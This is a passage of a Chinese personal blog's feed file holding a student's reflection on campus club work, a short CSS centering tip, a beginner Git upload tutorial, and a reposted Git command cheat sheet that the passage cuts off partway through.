-）</p><p>又到暑假了，规划两个月的学习及未来计划。</p><ul><li>主站改版10.2.1.20170711（版号）</li><li>规划培训工作。</li><li>ES5、ES6的原生学习</li><li>微信小程序的开发。</li></ul><hr><p>兴趣的培养，是自从加入校园组织开始的。一切都是缘分的开始，让我在这条路不断前进。今年，第二年。</p><p>初入大学时的我，羞涩、懵懂。高中都处在学习之中再学习的状态，没加过社团或学生会之类的，就特别希望大学能加入社团，特别特别的希望，就是那种收到恭喜您通过面试的短信然后跳起来转三圈yes的那种。</p><p>舍友都陆陆续续的去找社团面试了，我还在宿舍躺着，不知道该选什么好。晚上学长学姐扫楼的时候，发了几张招新表到我们宿舍，填上表去参加面试的那一刻，整个大学的故事就开始了。</p><p>今年，第二年，我当上了副站长。</p><p>感谢大佬们和小伙伴们的支持，睡觉都是爱你们的形状。<br><img src="https://cdn.zhengxiangling.com/19108046.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/19108046.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css居中</title>
      <link href="/2017/07/08/css%E5%B8%B8%E7%94%A8%E5%B1%85%E4%B8%AD/"/>
      <url>/2017/07/08/css%E5%B8%B8%E7%94%A8%E5%B1%85%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<p>css的居中方式有很多种</p><ul><li>文本居中 text-align</li><li>margin居中 0 auto</li><li>定位属性居中</li></ul><p>这里说的是margin来居中，建议减少定位position的使用。</p><span id="more"></span><p>会用到的css属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 最小宽度</span><br><span class="line"><span class="attribute">min-width</span>: <span class="number">1200px</span>;</span><br><span class="line"></span><br><span class="line"># 最大宽度</span><br><span class="line"><span class="attribute">max-width</span>: <span class="number">1920px</span>;</span><br></pre></td></tr></table></figure><p>效果图<br><img src="https://cdn.zhengxiangling.com/60886452.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/60886452.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><p>banner及footer属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">min-width</span>: <span class="number">1200px</span>;</span><br><span class="line"><span class="attribute">max-width</span>: <span class="number">1920px</span>;</span><br></pre></td></tr></table></figure><p>公用容器类container：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">1000px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>源码（放在github，自行clone下来）<br>  git 地址 <a href="https://github.com/zzzzzzxl/css">https://github.com/zzzzzzxl/css</a>_</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git入门</title>
      <link href="/2017/07/07/Git%E5%85%A5%E9%97%A8/"/>
      <url>/2017/07/07/Git%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="一、git实现简单的文件上传"><a href="#一、git实现简单的文件上传" class="headerlink" title="一、git实现简单的文件上传"></a>一、git实现简单的文件上传</h3><hr><p>（这里会用到coding）<a href="https://coding.net/">-&gt;</a></p><h4 id="创建自己的项目"><a href="#创建自己的项目" class="headerlink" title="创建自己的项目"></a>创建自己的项目</h4><ul><li>基础选项<ul><li>项目名称 – 建议用全英文</li><li>属性 – 公开</li></ul></li><li>初始化仓库<ul><li>启用README.md文件初始化项目</li></ul></li></ul><span id="more"></span><h4 id="clone到本地仓库"><a href="#clone到本地仓库" class="headerlink" title="clone到本地仓库"></a>clone到本地仓库</h4><p><img src="https://cdn.zhengxiangling.com/17-8-2/99368394.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/99368394.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>选择要clone到的文件夹，比如我要clone到桌面，我的桌面名字为Desktop</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> Desktop</span><br><span class="line">$ git <span class="built_in">clone</span> 你刚才复制的地址</span><br><span class="line"><span class="comment"># clone完成之后进入clone下来的文件夹里</span></span><br><span class="line">$ <span class="built_in">cd</span> [your_dir]</span><br></pre></td></tr></table></figure><h4 id="在clone下来的文件夹里新建文件"><a href="#在clone下来的文件夹里新建文件" class="headerlink" title="在clone下来的文件夹里新建文件"></a>在clone下来的文件夹里新建文件</h4><ul><li>然后进入clone好的文件夹里新建一个自定义文件，比如新建一个666.txt</li></ul><p><img src="https://cdn.zhengxiangling.com/17-8-2/28532100.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/28532100.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h4 id="查看此时本地仓库的状态"><a href="#查看此时本地仓库的状态" class="headerlink" title="查看此时本地仓库的状态"></a>查看此时本地仓库的状态</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 git status 命令</span></span><br><span class="line">$ git status</span><br></pre></td></tr></table></figure><p><img src="https://cdn.zhengxiangling.com/17-8-2/76557526.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/76557526.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h4 id="将修改文件添加到暂缓区（index）"><a href="#将修改文件添加到暂缓区（index）" class="headerlink" title="将修改文件添加到暂缓区（index）"></a>将修改文件添加到暂缓区（index）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 git add 命令</span></span><br><span class="line">$ git add 666.txt</span><br></pre></td></tr></table></figure><h4 id="确认无误后添加到本地仓库（repository）"><a href="#确认无误后添加到本地仓库（repository）" class="headerlink" title="确认无误后添加到本地仓库（repository）"></a>确认无误后添加到本地仓库（repository）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 git commit 命令 （-m 表示提交的信息）</span></span><br><span class="line">$ git commit -m <span class="string">&#x27;my_message&#x27;</span> (注意 -m 前后面都有一个空格)</span><br></pre></td></tr></table></figure><p>附：(没有则跳过)<br>如果提示出现please tell me who you are，按照求输入就行了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email &#x27;填写你的邮箱&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &#x27;你的名字&#x27;</span><br></pre></td></tr></table></figure><h4 id="本地修改完成后提交到远程仓库（remote）"><a href="#本地修改完成后提交到远程仓库（remote）" class="headerlink" title="本地修改完成后提交到远程仓库（remote）"></a>本地修改完成后提交到远程仓库（remote）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 git push 命令</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><h3 id="二、修改工作区文件，传到远程仓库"><a href="#二、修改工作区文件，传到远程仓库" class="headerlink" title="二、修改工作区文件，传到远程仓库"></a>二、修改工作区文件，传到远程仓库</h3><hr><ul><li>修改666.txt的内容,添加信息 hello world</li></ul><p><img src="https://cdn.zhengxiangling.com/17-8-2/44073607.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/44073607.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li><p>添加到暂缓区<br><code>$ git add 666.txt</code></p></li><li><p>添加到本地仓库<br><code>$ git commit -m &#39;我添加了一些信息&#39;</code></p></li><li><p>上传到远程仓库<br><code>$ git push</code></p></li></ul><p><img src="https://cdn.zhengxiangling.com/17-8-2/70902125.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/70902125.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><p>然后就可以看到上传的文件和备注的一些信息了。</p><blockquote><p>分享<br>廖雪峰的官方网站-Git教程<br><a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000">http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000</a></p></blockquote><blockquote><p>如有疑惑，欢迎留言提出~</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git之常用代码</title>
      <link href="/2017/07/07/Git%E5%88%9D%E6%8E%A2/"/>
      <url>/2017/07/07/Git%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<p>Git是一个分布式版本管理系统，是为了更好地管理Linux内核开发而创立的。</p><p>Git可以在任何时间点，把文档的状态作为更新记录保存起来。因此可以把编辑过的文档复原到以前的状态，也可以显示编辑前后的内容差异。</p><p>而且，编辑旧文件后，试图覆盖较新的文件的时候（即上传文件到服务器时），系统会发出警告，因此可以避免在无意中覆盖了他人的编辑内容。</p><span id="more"></span><h2 id="个人最常用的几个git指令："><a href="#个人最常用的几个git指令：" class="headerlink" title="个人最常用的几个git指令："></a>个人最常用的几个git指令：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在当前目录新建一个Git代码库</span></span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载一个项目和它的整个代码历史</span></span><br><span class="line">$ git <span class="built_in">clone</span> [url]</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加指定文件或文件夹到暂存区</span></span><br><span class="line">$ git add [file]/ [<span class="built_in">dir</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交暂存区到仓库区</span></span><br><span class="line">$ git commit -m [message]        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示有变更的文件</span></span><br><span class="line">$ git status    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 取回远程仓库的变化，并与本地分支合并</span></span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment">#上传本地指定分支到远程仓库</span></span><br><span class="line">$ git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复暂存区的指定文件到工作区</span></span><br><span class="line">$ git checkout [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重置暂存区与工作区，与上一次commit保持一致</span></span><br><span class="line">$ git reset --hard</span><br></pre></td></tr></table></figure><h2 id="高频git命令清单"><a href="#高频git命令清单" class="headerlink" title="高频git命令清单"></a>高频git命令清单</h2><blockquote><p>—— 转载自 <a href="http://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html">阮一峰的常用 Git 命令清单</a></p></blockquote><p><img src="https://cdn.zhengxiangling.com/17-8-2/83946609.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/17-8-2/83946609.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="git"></p><p>几个专用名词的译名如下。</p><p>Workspace：工作区<br>Index &#x2F; Stage：暂存区<br>Repository：仓库区（或本地仓库）<br>Remote：远程仓库</p><h3 id="新建代码库"><a href="#新建代码库" class="headerlink" title="新建代码库"></a>新建代码库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在当前目录新建一个Git代码库</span></span><br><span class="line">$ git init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个目录，将其初始化为Git代码库</span></span><br><span class="line">$ git init [project-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载一个项目和它的整个代码历史</span></span><br><span class="line">$ git <span class="built_in">clone</span> [url]</span><br></pre></td></tr></table></figure><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示当前的Git配置</span></span><br><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑Git配置文件</span></span><br><span class="line">$ git config -e [--global]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置提交代码时的用户信息</span></span><br><span class="line">$ git config [--global] user.name <span class="string">&quot;[name]&quot;</span></span><br><span class="line">$ git config [--global] user.email <span class="string">&quot;[email address]&quot;</span></span><br></pre></td></tr></table></figure><h3 id="增加-删除文件"><a href="#增加-删除文件" class="headerlink" title="增加&#x2F;删除文件"></a>增加&#x2F;删除文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加指定文件到暂存区</span></span><br><span class="line">$ git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加指定目录到暂存区，包括子目录</span></span><br><span class="line">$ git add [<span class="built_in">dir</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加当前目录的所有文件到暂存区</span></span><br><span class="line">$ git add .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加每个变化前，都会要求确认</span></span><br><span class="line"><span class="comment"># 对于同一个文件的多处变化，可以实现分次提交</span></span><br><span class="line">$ git add -p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除工作区文件，并且将这次删除放入暂存区</span></span><br><span class="line">$ git <span class="built_in">rm</span> [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止追踪指定文件，但该文件会保留在工作区</span></span><br><span class="line">$ git <span class="built_in">rm</span> --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改名文件，并且将这个改名放入暂存区</span></span><br><span class="line">$ git <span class="built_in">mv</span> [file-original] [file-renamed]</span><br></pre></td></tr></table></figure><h3 id="代码提交"><a href="#代码提交" class="headerlink" title="代码提交"></a>代码提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提交暂存区到仓库区</span></span><br><span class="line">$ git commit -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交暂存区的指定文件到仓库区</span></span><br><span class="line">$ git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交工作区自上次commit之后的变化，直接到仓库区</span></span><br><span class="line">$ git commit -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交时显示所有diff信息</span></span><br><span class="line">$ git commit -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用一次新的commit，替代上一次提交</span></span><br><span class="line"><span class="comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span></span><br><span class="line">$ git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重做上一次commit，并包括指定文件的新变化</span></span><br><span class="line">$ git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure><h3 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有本地分支</span></span><br><span class="line">$ git branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有远程分支</span></span><br><span class="line">$ git branch -r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有本地分支和远程分支</span></span><br><span class="line">$ git branch -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，但依然停留在当前分支</span></span><br><span class="line">$ git branch [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，并切换到该分支</span></span><br><span class="line">$ git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向指定commit</span></span><br><span class="line">$ git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，与指定的远程分支建立追踪关系</span></span><br><span class="line">$ git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到指定分支，并更新工作区</span></span><br><span class="line">$ git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到上一个分支</span></span><br><span class="line">$ git checkout -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立追踪关系，在现有分支与指定的远程分支之间</span></span><br><span class="line">$ git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并指定分支到当前分支</span></span><br><span class="line">$ git merge [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个commit，合并进当前分支</span></span><br><span class="line">$ git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除分支</span></span><br><span class="line">$ git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程分支</span></span><br><span class="line">$ git push origin --delete [branch-name]</span><br><span class="line">$ git branch -dr [remote/branch]</span><br></pre></td></tr></table></figure><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出所有tag</span></span><br><span class="line">$ git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在当前commit</span></span><br><span class="line">$ git tag [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个tag在指定commit</span></span><br><span class="line">$ git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除本地tag</span></span><br><span class="line">$ git tag -d [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除远程tag</span></span><br><span class="line">$ git push origin :refs/tags/[tagName]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看tag信息</span></span><br><span class="line">$ git show [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交指定tag</span></span><br><span class="line">$ git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交所有tag</span></span><br><span class="line">$ git push [remote] --tags</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个分支，指向某个tag</span></span><br><span class="line">$ git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure><h3 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示有变更的文件</span></span><br><span class="line">$ git status</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的版本历史</span></span><br><span class="line">$ git <span class="built_in">log</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示commit历史，以及每次commit发生变更的文件</span></span><br><span class="line">$ git <span class="built_in">log</span> --<span class="built_in">stat</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索提交历史，根据关键词</span></span><br><span class="line">$ git <span class="built_in">log</span> -S [keyword]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个commit之后的所有变动，每个commit占据一行</span></span><br><span class="line">$ git <span class="built_in">log</span> [tag] HEAD --pretty=format:%s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span></span><br><span class="line">$ git <span class="built_in">log</span> [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个文件的版本历史，包括文件改名</span></span><br><span class="line">$ git <span class="built_in">log</span> --follow [file]</span><br><span class="line">$ git whatchanged [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件相关的每一次diff</span></span><br><span class="line">$ git <span class="built_in">log</span> -p [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示过去5次提交</span></span><br><span class="line">$ git <span class="built_in">log</span> -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有提交过的用户，按提交次数排序</span></span><br><span class="line">$ git shortlog -sn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定文件是什么人在什么时间修改过</span></span><br><span class="line">$ git blame [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和工作区的差异</span></span><br><span class="line">$ git diff</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示暂存区和上一个commit的差异</span></span><br><span class="line">$ git diff --cached [file]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示工作区与当前分支最新commit之间的差异</span></span><br><span class="line">$ git diff HEAD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示两次提交之间的差异</span></span><br><span class="line">$ git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示今天你写了多少行代码</span></span><br><span class="line">$ git diff --shortstat <span class="string">&quot;@&#123;0 day ago&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交的元数据和内容变化</span></span><br><span class="line">$ git show [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交发生变化的文件</span></span><br><span class="line">$ git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某次提交时，某个文件的内容</span></span><br><span class="line">$ git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示当前分支的最近几次提交</span></span><br><span class="line">$ git reflog</span><br><span class="line"><span class="comment">### 远程同步</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载远程仓库的所有变动</span></span><br><span class="line">$ git fetch [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示所有远程仓库</span></span><br><span class="line">$ git remote -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示某个远程仓库的信息</span></span><br><span class="line">$ git remote show [remote]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加一个新的远程仓库，并命名</span></span><br><span class="line">$ git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取回远程仓库的变化，并与本地分支合并</span></span><br><span class="line">$ git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地指定分支到远程仓库</span></span><br><span class="line">$ git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 强行推送当前分支到远程仓库，即使有冲突</span></span><br><span class="line">$ git push [remote] --force</span><br><span class="line"></span><br><span class="line"><span class="comment"># 推送所有分支到远程仓库</span></span><br><span class="line">$ git push [remote] --all</span><br></pre></td></tr></table></figure><h3 id="撤销"><a href="#撤销" class="headerlink" title="撤销"></a>撤销</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 